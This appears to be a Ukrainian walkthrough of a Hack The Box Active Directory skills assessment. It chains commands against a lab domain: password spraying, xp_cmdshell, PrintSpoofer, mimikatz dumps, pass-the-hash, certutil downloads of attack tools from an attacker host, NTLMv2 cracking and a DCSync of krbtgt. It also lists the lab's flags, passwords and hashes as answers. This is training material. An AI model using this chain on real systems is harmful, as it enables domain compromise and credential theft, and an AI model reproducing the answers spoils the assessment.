AD Enumeration & Attacks – Skills Assessment Part II (Q1–Q12)
Ланцюжок повного компромісу домену INLANEFREIGHT.LOCAL від перших кредів до KRBTGT.
Формат: питання → ціль → команди → відповідь.

Q1 – Initial Foothold User
Питання: який доменний користувач дає нам перший доступ?

Ціль
Знайти валідний доменний акаунт і пароль для початкового входу в домен.

Кроки
bash
# 1) Скан всіх хостів у підмережі
sudo nmap -v -A -Pn 172.16.7.0/24 -oN host-enum
bash
# 2) LDAP‑енумерація домену
ldapsearch -x -h 172.16.7.3 -b "DC=INLANEFREIGHT,DC=LOCAL"
bash
# 3) Підбір валідних логінів
kerbrute userenum -d inlanefreight.local --dc 172.16.7.3 users.txt
bash
# 4) Пароль‑спрей по знайдених користувачах
crackmapexec smb 172.16.7.3 -u users.txt -p Password123 --no-bruteforce
Відповідь
User: AB920 (приклад із методички/шпаргалки).

Q2–Q4 – Domain Recon with Valid Creds
Питання: декілька проміжних відповідей (ім’я групи, шару, користувача тощо).

Ціль
Зібрати максимум інформації про домен, політики, групи, шари та інші облікові записи, використовуючи кред з Q1.

Корисні команди
bash
# Перевірка політики паролів, груп, користувачів
crackmapexec smb 172.16.7.3 -u AB920 -p '<PASSWORD>' --users --groups --loggedon-users --shares
bash
# Глибша енумація через rpcclient
rpcclient -U AB920%'<'PASSWORD'>' 172.16.7.3
rpcclient $> querydominfo
rpcclient $> enumdomusers
bash
# Перевірка шарів і вмісту
smbmap -u AB920 -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
smbmap -u AB920 -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R SYSVOL --dir-only
Відповіді
Q2/Q3/Q4 залежать від конкретних артефактів (назва шару, ім’я групи, ін.); всі вони беруться з результатів команд вище та документовані у PDF/шпаргалці HTB.

Q5 – SQL Service Credentials
Питання: який пароль SQL‑сервісного юзера (для SQL01)?

Ціль
Знайти скрипт/конфіг із збереженими MSSQL‑кредами.

Кроки
bash
# 1) Рекурсивний пошук файлів із секретами в шари
crackmapexec smb 172.16.7.3 -u AB920 -p '<PASSWORD>' -M spider_plus --share Dev-share
bash
# 2) Завантажити та переглянути знайдений файл
smbclient //172.16.7.3/Dev-share -U AB920%'<'PASSWORD'>'
smb: \> get db_backup.txt
cat db_backup.txt
Файл містить логін/пароль для SQL‑сервісу.

Відповідь
Password: D@ta_bAse_adm1n! (за матеріалами тренажера).
​

Q6 – MSSQL Access & xp_cmdshell (SQL01)
Питання: під яким акаунтом виконується xp_cmdshell на SQL01?

Ціль
Підключитися до SQL01, ввімкнути xp_cmdshell і побачити контекст процесу.

Кроки
bash
# 1) Підключення до MSSQL (з Parrot)
mssqlclient.py INLANEFREIGHT.LOCAL/sql_svc@SQL01.inlanefreight.local -windows-auth
sql
-- 2) Увімкнути xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
sql
-- 3) Перевірити контекст
SQL> EXEC xp_cmdshell 'whoami';
Результат:

text
nt service\mssql$sqlexpress
Відповідь
Account: NT SERVICE\MSSQL$SQLEXPRESS (або ім’я сервісного акаунта SQL із whoami).
​
​

Q7 – Flag on SQL01 via SeImpersonate
Питання: який флаг у C:\Users\Administrator\Desktop\flag.txt на SQL01?

Ціль
Зловити SYSTEM на SQL01 через SeImpersonatePrivilege (PrintSpoofer) і прочитати флаг.

Кроки
Доставити та запустити PrintSpoofer / аналог через існуючий доступ (msf/meterpreter або cmd).

Отримати Meterpreter як SYSTEM, потім:

text
meterpreter > load kiwi
meterpreter > lsa_dump_sam
Серед виводу:

text
User : Administrator
Hash NTLM : bdaffbfe64f1fc646a3353be1c2c3c99
Як SYSTEM на SQL01:

text
type C:\Users\Administrator\Desktop\flag.txt
Флаг:

text
s3imp3rs0nate_cl@ssic
Відповідь
Flag Q7: s3imp3rs0nate_cl@ssic.
​

Q8 – Flag on MS01 via Pass‑the‑Hash
Питання: який флаг у C:\Users\Administrator\Desktop\flag.txt на MS01?

Ціль
Застосувати PTH з локальним NTLM Administrator (із SQL01) для доступу до MS01.

Кроки
bash
# 1) Evil‑WinRM із PTH на MS01
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
powershell
# 2) Прочитати flag.txt
cd C:\Users\Administrator\Desktop
dir
more .\flag.txt
Вміст:

text
exc3ss1ve_adm1n_r1ights!
Відповідь
Flag Q8: exc3ss1ve_adm1n_r1ights!.
​

Q9 – User with GenericAll on Domain Admins
Питання: який користувач має GenericAll на групу Domain Admins?

Ціль
Проаналізувати ACL Domain Admins через PowerView і знайти ACE з правом GenericAll.

Кроки
powershell
# 1) Скинути PowerView на MS01
certutil.exe -urlcache -f http://172.16.7.240:8000/PowerView.ps1 .\PowerView.ps1
Import-Module .\PowerView.ps1
powershell
# 2) Зібрати ACL об’єкта Domain Admins (SID групи)
$acl = Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
$acl | ? { $_.ActiveDirectoryRights -eq 'GenericAll' }
powershell
# 3) Конвертувати SID → ім’я
Convert-SidToName "S-1-5-21-3327542485-274640656-2609762496-4611"
Результат:

text
INLANEFREIGHT\CT059
Відповідь
User Q9: CT059.
​

Q10 – Cracking CT059 via Inveigh
Питання: який пароль користувача CT059?

Ціль
Зловити NTLMv2 CT059 за допомогою Inveigh на MS01 і розкодувати його через hashcat.

Кроки
powershell
# 1) Inveigh на MS01
certutil.exe -urlcache -f http://172.16.7.240:8000/Inveigh.ps1 .\Inveigh.ps1
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y
powershell
# 2) Проглянути лог із NTLMv2
more Inveigh-NTLMv2.txt
Фрагмент:

text
CT059::INLANEFREIGHT:...:0101000000... (NTLMv2 hash line)
bash
# 3) Crack NTLMv2 через hashcat
hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt --force
Результат:

text
...:charlie1
Відповідь
Password Q10: charlie1.
​
​

Q11 – Domain Admin & Flag on DC01
Питання: який флаг на Desktop адміністратора на DC01 після доменного компромісу?

Ціль
Додати CT059 до Domain Admins, зайти на DC01 і прочитати флаг.

Кроки
bash
# 1) Логін на MS01 як CT059
evil-winrm -i 172.16.7.50 -u CT059 -p charlie1
powershell
# 2) Додати себе в Domain Admins
net group "Domain Admins" CT059 /add /domain
powershell
# 3) Створити PSCredential і PSSession на DC01
$cred = New-Object System.Management.Automation.PSCredential(
  "INLANEFREIGHT\CT059",
  (ConvertTo-SecureString "charlie1" -AsPlainText -Force)
)
Enter-PSSession -ComputerName DC01 -Credential $cred
powershell
# 4) Прочитати флаг на DC01
[DC01]: PS> more C:\Users\administrator\Desktop\flag.txt
Вміст:

text
acLs_f0r_th3_w1n!
Відповідь
Flag Q11: acLs_f0r_th3_w1n!.
​

Q12 – KRBTGT NTLM Hash (Full Domain Compromise)
Питання: який NTLM‑хеш у KRBTGT для INLANEFREIGHT.LOCAL?

Ціль
Виконати DCSync для облікового запису krbtgt і витягти його NTLM‑хеш.

Кроки
bash
# 1) Psexec на DC01 як CT059 (Domain Admin)
psexec.py inlanefreight.local/CT059:charlie1@172.16.7.3
У cmd на DC01 запускаємо mimikatz:

text
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
Фрагмент:

text
** SAM ACCOUNT **

SAM Username         : krbtgt
...
Hash NTLM: 7eba70412d81c1cd030d72a3e8dbe05f
Відповідь
KRBTGT NTLM (Q12): 7eba70412d81c1cd030d72a3e8dbe05f.
